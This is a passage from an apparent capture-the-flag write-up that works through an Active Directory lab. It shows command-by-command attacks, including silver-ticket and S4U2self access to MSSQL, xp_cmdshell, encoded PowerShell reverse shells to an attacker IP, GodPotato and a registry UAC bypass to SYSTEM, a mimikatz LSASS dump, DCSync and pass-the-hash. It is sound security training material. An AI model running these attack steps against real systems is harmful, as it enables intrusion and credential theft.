+<p>We can now use this forged ticket to authenticate to the <code class="language-plaintext highlighter-rouge">MSSQL</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> as <code class="language-plaintext highlighter-rouge">Administrator</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ export KRB5CCNAME=Administrator.ccache
+~$ mssqlclient.py -k -no-pass sql01.antennae.rv                                       
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (ANTENNAE.RV\Administrator  dbo@master)&gt; 
+</code></pre></div></div>
+
+<p>If we decrypt the ticket using <code class="language-plaintext highlighter-rouge">describeTicket.py</code>, and inspect the <code class="language-plaintext highlighter-rouge">PAC</code> - we’ll find that the <code class="language-plaintext highlighter-rouge">PAC_LOGON_INFO</code> structure now contains information about the <code class="language-plaintext highlighter-rouge">Administrator</code> user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ describeTicket.py Administrator.ccache --rc4 'dafede3a0d35ddb28147bd418e4cd53b'
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+
+[...snip...]
+
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : MSSQLSvc/sql01.antennae.rv
+[*]   Service Realm               : ANTENNAE.RV
+[*]   Encryption type             : rc4_hmac (etype 23)
+[*] Decoding credential[0]['ticket']['enc-part']:
+[*]   LoginInfo                   
+[...snip...]
+[*]     Account Name              : Administrator
+[*]     Logon Count               : 500
+[*]     Bad Password Count        : 0
+[*]     User RID                  : 500
+[*]     Group RID                 : 513
+[*]     Group Count               : 5
+[*]     Groups                    : 513, 512, 520, 518, 519
+[*]     Groups (decoded)          : (513) Domain Users
+[*]                                 (512) Domain Admins
+[*]                                 (520) Group Policy Creator Owners
+[*]                                 (518) Schema Admins
+[*]                                 (519) Enterprise Admins
+[*]     User Flags                : (0) 
+[*]     User Session Key          : 00000000000000000000000000000000
+[*]     Logon Server              : 
+[*]     Logon Domain Name         : ANTENNAE.RV
+[*]     Logon Domain SID          : S-1-5-21-1843653573-2831615454-1469364877
+[*]     User Account Control      : (528) USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
+[*]     Extra SID Count           : 0
+[*]     Extra SIDs                :
+[*]     Resource Group Domain SID :
+[*]     Resource Group Count      : 0
+[*]     Resource Group Ids        : 
+[*]     LMKey                     : 0000000000000000
+[*]     SubAuthStatus             : 0
+[*]     Reserved3                 : 0
+</code></pre></div></div>
+<h3 id="accessing-mssql-as-administrator">Accessing MSSQL as Administrator</h3>
+
+<p>As we demonstrated earlier, we can now access the <code class="language-plaintext highlighter-rouge">MSSQL</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> as <code class="language-plaintext highlighter-rouge">Administrator</code>. From here, we can enable the <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17">xp_cmdshell</a> stored procedure, which allows us to execute arbitrary commands on the underlying operating system.</p>
+
+<blockquote>
+  <p>This is disabled by default for security reasons, but since we are <code class="language-plaintext highlighter-rouge">Administrator</code>, we can enable it.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (ANTENNAE.RV\Administrator  dbo@master)&gt; EXEC sp_configure 'show advanced options', 1;
+INFO(SQL01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (ANTENNAE.RV\Administrator  dbo@master)&gt; RECONFIGURE;
+SQL (ANTENNAE.RV\Administrator  dbo@master)&gt; EXEC sp_configure 'xp_cmdshell', 1;
+INFO(SQL01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (ANTENNAE.RV\Administrator  dbo@master)&gt; RECONFIGURE;
+</code></pre></div></div>
+
+<p>Now, we can use the stored procedure to execute commands on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> as <code class="language-plaintext highlighter-rouge">svc_sql</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (ANTENNAE.RV\Administrator  dbo@master)&gt; xp_cmdshell whoami
+output             
+----------------   
+antennae\svc_sql   
+
+NULL 
+</code></pre></div></div>
+
+<h3 id="local-privilege-escalation">Local Privilege Escalation</h3>
+
+<p>From this, we can obtain a reverse shell on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> using a powershell one-liner obtained from <a href="https://www.revshells.com/">revshells.com</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (ANTENNAE.RV\Administrator  dbo@master)&gt; xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8[....snip....]uAEMAbABvAHMAZQAoACkA
+</code></pre></div></div>
+
+<p>This reverse shell points to our attacking machine, on port <code class="language-plaintext highlighter-rouge">8443</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nc -lnvp 8443
+listening on [any] 8443 ...
+connect to [198.51.100.5] from (UNKNOWN) [10.5.10.11] 59996
+
+PS C:\Windows\system32&gt; whoami
+antennae\svc_sql
+PS C:\Windows\system32&gt; 
+</code></pre></div></div>
+
+<p>Local service accounts typically have some level of elevated privileges on the machine, this is often a requirement to provision services. In this case, we’ll see that the <code class="language-plaintext highlighter-rouge">svc_sql</code> has the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privilege:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre></div></div>
+
+<p>The <a href="https://www.plesk.com/kb/support/microsoft-windows-seimpersonateprivilege-local-privilege-escalation/">SeImpersonatePrivilege</a> privilege is a well-documented local privilege escalation vector, and can be exploited with various <a href="https://ohpe.it/juicy-potato/">Potato</a> variants. In this case, we can use <a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> to obtain a reverse shell as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\windows\tasks&gt; .\GodPotato.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYg[....snip....AEMAbABvAHMAZQAoACkA"
+</code></pre></div></div>
+
+<p>Similar to before, this reverse shell points to our attacking machine, on port <code class="language-plaintext highlighter-rouge">9443</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nc -lnvp 8443                                                               
+listening on [any] 8443 ...
+connect to [198.51.100.5] from (UNKNOWN) [10.5.10.11] 60010
+
+PS C:\windows\tasks&gt; whoami
+nt authority\system
+</code></pre></div></div>
+
+<p>And finally, we can grab the <code class="language-plaintext highlighter-rouge">flag5.txt</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\Tasks&gt; cat C:\Users\Administrator\Desktop\flag5.txt
+RV{s1LVeR_tICk3Ts_aRe_oFteN_0V3Rl0oK3d_fOR_PRIv!13ge_3ScALaTION_:)_87b96b7fefeaa679845950e6042e2a8c}
+</code></pre></div></div>
+
+<h2 id="path-2-s4u2self">Path 2: S4u2self</h2>
+
+<p>An alternative to forging an arbitrary service ticket is to use the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13">S4u2self</a> extension of the <code class="language-plaintext highlighter-rouge">Kerberos</code> protocol. This extension <code class="language-plaintext highlighter-rouge">allows a service to obtain a service ticket to itself on behalf of a user.</code>.</p>
+
+<p>This allows the <code class="language-plaintext highlighter-rouge">svc_sql</code> user to request for a service ticket to the <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code> SPN on behalf of any user in the domain - including privileged users like <code class="language-plaintext highlighter-rouge">Administrator</code>. This is possible because <code class="language-plaintext highlighter-rouge">svc_sql</code> has the <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code> SPN registered to it.</p>
+
+<h3 id="s4u2self-extension">S4u2self Extension</h3>
+
+<p>We can use <code class="language-plaintext highlighter-rouge">getST.py</code> to request for a service ticket to the <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code> SPN on behalf of <code class="language-plaintext highlighter-rouge">Administrator</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ getST.py -self -altservice 'MSSQLSvc/sql01.antennae.rv' -impersonate 'Administrator' 'antennae.rv'/'svc_sql':'P@ssw0rd_f0r_SQL-antennae'
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Changing service from svc_sql@ANTENNAE.RV to MSSQLSvc/sql01.antennae.rv@ANTENNAE.RV
+[*] Saving ticket in Administrator@MSSQLSvc_sql01.antennae.rv@ANTENNAE.RV.ccache
+</code></pre></div></div>
+
+<h3 id="accessing-mssql-as-administrator-1">Accessing MSSQL as Administrator</h3>
+
+<p>As we did before, we can use this <code class="language-plaintext highlighter-rouge">s4u</code> ticket to authenticate to the <code class="language-plaintext highlighter-rouge">MSSQL</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> as <code class="language-plaintext highlighter-rouge">Administrator</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ export KRB5CCNAME='Administrator@MSSQLSvc_sql01.antennae.rv@ANTENNAE.RV.ccache'
+~$ mssqlclient.py -k -no-pass sql01.antennae.rv
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (antennae\Administrator  dbo@master)&gt; 
+</code></pre></div></div>
+
+<p>From here, we can follow the same steps as before to enable <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>, obtain a reverse shell as <code class="language-plaintext highlighter-rouge">svc_sql</code>, and finally escalate to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code> using <code class="language-plaintext highlighter-rouge">GodPotato</code>.</p>
+
+<h2 id="path-3-runas">Path 3: RunAs</h2>
+
+<p>Another, cleaner, alternative is to simply spawn a process as the <code class="language-plaintext highlighter-rouge">svc_sql</code> user from the existing local session we have as <code class="language-plaintext highlighter-rouge">wei.jie.tan</code>. This can be done <a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>, a C# implementation of the <code class="language-plaintext highlighter-rouge">runas</code> command that supports passing in plaintext passwords.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\windows\tasks&gt; .\RunasCs.exe 'svc_sql' P@ssw0rd_f0r_SQL-antennae powershell.exe -d antennae.rv -r 198.51.100.5:8443
+[*] Warning: The logon for user 'svc_sql' is limited. Use the flag combination --bypass-uac and --logon-type '5' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-9138862$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4424 created in background.
+</code></pre></div></div>
+
+<h3 id="uac-bypass-via-computerdefaultsexe">UAC Bypass via computerdefaults.exe</h3>
+
+<p>However, you may find that the obtained reverse shell is limited by <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works">User Account Control (UAC)</a> and as a result - lacks the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privilege:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID                                           
+================ ==============================================
+antennae\svc_sql S-1-5-21-1843653573-2831615454-1469364877-1110
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes                                        
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+antennae\service-accounts                  Group            S-1-5-21-1843653573-2831615454-1469364877-1125 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+</code></pre></div></div>
+
+<p>This can be simply bypassed with any of the <code class="language-plaintext highlighter-rouge">UAC</code> bypass methods, for example using <code class="language-plaintext highlighter-rouge">computerdefaults.exe</code>. Where <code class="language-plaintext highlighter-rouge">C:\Windows\Tasks\revshell.exe</code> is a reverse shell generated with <a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">msfvenom</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt; reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f &amp;&amp; reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "C:\Windows\Tasks\revshell.exe" /f &amp;&amp; start computerdefaults.exe
+</code></pre></div></div>
+
+<p>From here, we can follow the same steps as before to obtain a reverse shell as <code class="language-plaintext highlighter-rouge">svc_sql</code>, and finally escalate to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code> using <code class="language-plaintext highlighter-rouge">GodPotato</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nc -lnvp 8443
+listening on [any] 8443 ...
+connect to [198.51.100.5] from (UNKNOWN) [10.5.10.11] 60583
+
+PS C:\Windows\system32&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre></div></div>
+
+<h2 id="path-4-adding-svc_sql-to-senior-developers">Path 4: Adding <code class="language-plaintext highlighter-rouge">svc_sql</code> to <code class="language-plaintext highlighter-rouge">senior-developers</code></h2>
+
+<p>This was a path that we were aware of during the competition, but was explicitly forbidden in the rules as it may be disruptive to other players. Anyway, this path is quite straightforward - simply using <code class="language-plaintext highlighter-rouge">jolene.ong</code> to add <code class="language-plaintext highlighter-rouge">svc_sql</code> to the <code class="language-plaintext highlighter-rouge">senior-developers</code> group, which can <code class="language-plaintext highlighter-rouge">SSH</code> into <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodyAD --host 'dc01.antennae.rv' -u 'jolene.ong' -p 'BoXALrqvqPd3' add groupMember 'senior-developers' 'svc_sql'
+[+] svc_sql added to senior-developers
+</code></pre></div></div>
+
+<p>We can then <code class="language-plaintext highlighter-rouge">SSH</code> into <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> as <code class="language-plaintext highlighter-rouge">svc_sql</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'P@ssw0rd_f0r_SQL-antennae' ssh 'svc_sql'@sql01.antennae.rv
+
+PS C:\Users\svc_sql&gt; whoami
+antennae\svc_sql
+</code></pre></div></div>
+
+<p>Similar to before, we can do the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> exploit with <code class="language-plaintext highlighter-rouge">GodPotato</code> to escalate to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p>
+
+<h1 id="flag-6-antennae">Flag 6: Antennae</h1>
+
+<p><img src="/assets/img/rv-sept/6.png" alt="" /></p>
+
+<p>Finally, with local <code class="language-plaintext highlighter-rouge">SYSTEM</code> access on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> - we can obtain credentials from logged on users by dumping the <a href="https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before"><code class="language-plaintext highlighter-rouge">LSASS</code></a> process. This allows us to steal <code class="language-plaintext highlighter-rouge">NTLM</code> hashes of users that have previously logged into the machine.</p>
+
+<h2 id="dumping-lsass">Dumping LSASS</h2>
+
+<p>We can do this with <code class="language-plaintext highlighter-rouge">sekurlsa::logonpasswords</code> from <a href="https://github.com/gentilkiwi/mimikatz">mimikatz.exe</a>, and find the <code class="language-plaintext highlighter-rouge">NTLM</code> hash of <code class="language-plaintext highlighter-rouge">kai.wen.goh</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\tasks&gt;.\mimikatz.exe "sekurlsa::logonpasswords" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 153166753 (00000000:092123a1)
+Session           : Batch from 0
+User Name         : kai.wen.goh
+Domain            : antennae
+Logon Server      : DC01
+Logon Time        : 9/8/2025 12:41:46 AM
+SID               : S-1-5-21-1843653573-2831615454-1469364877-1122
+        msv :
+         [00000003] Primary
+         * Username : kai.wen.goh
+         * Domain   : antennae
+         * NTLM     : 56e7e432c955bfdbb8f57d1248417116
+         * SHA1     : f0d0a4ae3f6aeac2d677f1c6675c757453b18c37
+         * DPAPI    : 81ce964944648399d64c9f933d25fc62
+        tspkg :
+        wdigest :
+         * Username : kai.wen.goh
+         * Domain   : antennae
+         * Password : (null)
+        kerberos :
+         * Username : kai.wen.goh
+         * Domain   : ANTENNAE.RV
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+</code></pre></div></div>
+
+<p>We can verify that these credentials are valid for the domain with <code class="language-plaintext highlighter-rouge">nxc</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'kai.wen.goh' -H '56e7e432c955bfdbb8f57d1248417116'
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\kai.wen.goh:56e7e432c955bfdbb8f57d1248417116 (Pwn3d!)
+</code></pre></div></div>
+
+<p>On <code class="language-plaintext highlighter-rouge">BloodHound</code>, we find that the <code class="language-plaintext highlighter-rouge">kai.wen.goh</code> user is a member of the <code class="language-plaintext highlighter-rouge">Domain Admins</code> group - which is a member of the <code class="language-plaintext highlighter-rouge">Administrators</code> group on <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code>.</p>
+
+<p><img src="/assets/img/rv-sept/bh6.png" alt="" /></p>
+
+<h2 id="dcsync-attack">DCSync Attack</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">Domain Admins</code> group has full administrative access to the entire domain, and this includes performing <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/replication/
+active-directory-replication-concepts">Domain Replication</a> - this technique can be extended to replicate domain credentials, also known as a <a href="https://www.semperis.com/blog/dcsync-attack/">DCSync</a> attack. We can perform this attack using <code class="language-plaintext highlighter-rouge">nxc</code> to obtain the <code class="language-plaintext highlighter-rouge">NTLM</code> hash of the <code class="language-plaintext highlighter-rouge">Administrator</code> user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc01.antennae.rv -u 'kai.wen.goh' -H '56e7e432c955bfdbb8f57d1248417116' --ntds --user 'Administrator'
+SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.10      445    DC01             [+] antennae.rv\kai.wen.goh:56e7e432c955bfdbb8f57d1248417116 (Pwn3d!)
+SMB         10.5.10.10      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.5.10.10      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:4b1b716bb4ad29c4efaf682577361070:::
+</code></pre></div></div>
+
+<p>We can verify that these credentials are valid for the domain with <code class="language-plaintext highlighter-rouge">nxc</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'Administrator' -H '4b1b716bb4ad29c4efaf682577361070'
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\Administrator:4b1b716bb4ad29c4efaf682577361070 (Pwn3d!)
+</code></pre></div></div>
+
+<p>Lastly, we can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> to authenticate to <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code> as <code class="language-plaintext highlighter-rouge">Administrator</code> and grab the <code class="language-plaintext highlighter-rouge">flag6.txt</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ evil-winrm -i dc01.antennae.rv -u 'Administrator' -H '4b1b716bb4ad29c4efaf682577361070'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat C:\Users\Administrator\Desktop\flag6.txt
+RV{aNd_The_Pil1@r$_st@rt_dROpp!nG_170fee6a4def44375b5c5ecbc0b87efe}
+</code></pre></div></div>
+
+<h1 id="flag-7-privilege-deescalation">Flag 7: Privilege (De)escalation?</h1>
+
+<p><img src="/assets/img/rv-sept/7.png" alt="" /></p>
+
+<p>This challenge, sadly, only had one solve. This flag is the first challenge in the <code class="language-plaintext highlighter-rouge">backward.rv</code> forest, which has a <a href="https://www.thehacker.recipes/ad/movement/trusts/">bidirectional trust</a> with the compromised <code class="language-plaintext highlighter-rouge">antennae.rv</code> forest.</p>
+
+<p>A <a href="https://www.thehacker.recipes/ad/movement/trusts/">bidirectional trust</a> established between two Active Directory forests allows users in either forest to access resources in the other forest, provided they have the necessary permissions. This often means that a user from one forest can be granted access to resources in the other forest, and vice versa. In this case, a user in <code class="language-plaintext highlighter-rouge">antennae.rv</code> can potentially access resources in <code class="language-plaintext highlighter-rouge">backward.rv</code>, and vice versa.</p>
+
+<h2 id="cross-forest-enumeration">Cross-Forest Enumeration</h2>
+
+<p>In order to faciliate the use of <code class="language-plaintext highlighter-rouge">BloodHound</code> to ingest data from both forests, we need to re-run <code class="language-plaintext highlighter-rouge">bloodhound-ce-python</code> against the <code class="language-plaintext highlighter-rouge">backward.rv</code> forest:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodhound-ce-python -u 'jolene.ong@antennae.rv' -p 'BoXALrqvqPd3' -d 'backward.rv' -c 'All' -ns '10.5.10.12' --zip
+INFO: BloodHound.py for BloodHound Community Edition
+INFO: Found AD domain: backward.rv
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc02.backward.rv
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: dc02.backward.rv
+INFO: Found 20 users
+INFO: Found 55 groups
+INFO: Found 2 gpos
+INFO: Found 3 ous
+INFO: Found 19 containers
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: SRV01.backward.rv
+INFO: Querying computer: DC02.backward.rv
+INFO: Done in 00M 03S
+INFO: Compressing output into 20250907125945_bloodhound.zip
+</code></pre></div></div>
+
+<p>After ingesting this data into <code class="language-plaintext highlighter-rouge">BloodHound</code>, we can now see the <code class="language-plaintext highlighter-rouge">backward.rv</code> forest in the <code class="language-plaintext highlighter-rouge">BloodHound</code> interface.</p>
+
+<p><img src="/assets/img/rv-sept/bwbh.png" alt="" /></p>
+
+<h2 id="finding-foreign-group-memberships">Finding Foreign Group Memberships</h2>
+
+<p>We can enumerate for foreign group memberships using the <code class="language-plaintext highlighter-rouge">Queries</code> tab in <code class="language-plaintext highlighter-rouge">BloodHound</code>. This is a built-in query, labelled as: <code class="language-plaintext highlighter-rouge">Principals with foreign domain group membership</code>. We’ll find that <code class="language-plaintext highlighter-rouge">natasha.lim@antennae.rv</code> is a member of the <code class="language-plaintext highlighter-rouge">Maintainers</code> group in <code class="language-plaintext highlighter-rouge">backward.rv</code>.</p>
+
+<p><img src="./assets/img/rv-sept/ntlm.png" alt="" /></p>
+
+<p>Additionally, we’ll find that the <code class="language-plaintext highlighter-rouge">Maintainers</code> group has <code class="language-plaintext highlighter-rouge">GenericAll</code> permissions on the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group in <code class="language-plaintext highlighter-rouge">backward.rv</code>.</p>
+
+<p><img src="./assets/img/rv-sept/sysadmins.png" alt="" /></p>
+
+<h2 id="dcsyncing-natashalim">DCSyncing natasha.lim</h2>
+
+<p>As we did before with the <code class="language-plaintext highlighter-rouge">Administrator@antennae.rv</code> user, we can perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack to obtain the <code class="language-plaintext highlighter-rouge">NTLM</code> hash of the <code class="language-plaintext highlighter-rouge">natasha.lim</code> user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc01.antennae.rv -u 'kai.wen.goh' -H '56e7e432c955bfdbb8f57d1248417116' --ntds --user 'natasha.lim'
+SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.10      445    DC01             [+] antennae.rv\kai.wen.goh:56e7e432c955bfdbb8f57d1248417116 (Pwn3d!)
+SMB         10.5.10.10      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.5.10.10      445    DC01             natasha.lim:1123:aad3b435b51404eeaad3b435b51404ee:0a1bc6b13cd3106322a6d5bbb0293e44:::
+</code></pre></div></div>
+
+<h2 id="foreign-maq">Foreign MAQ</h2>
+
